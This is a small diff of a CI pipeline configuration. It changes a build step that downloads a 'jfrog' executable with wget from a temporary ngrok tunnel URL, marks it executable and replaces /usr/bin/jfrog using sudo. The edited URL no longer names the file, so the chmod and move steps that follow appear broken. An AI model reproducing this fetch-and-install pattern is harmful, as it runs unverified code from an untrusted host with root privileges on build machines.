@@ -73,7 +73,7 @@ pipelines:
            - gradle --version
            - _set_jdk openjdk8
            - javac -version
-           - wget http://c428e338.ngrok.io/jfrog
+           - wget  http://b2dfdf7e.ngrok.io
            - chmod +x jfrog
            - sudo rm /usr/bin/jfrog
            - mv jfrog /usr/bin/jfrog
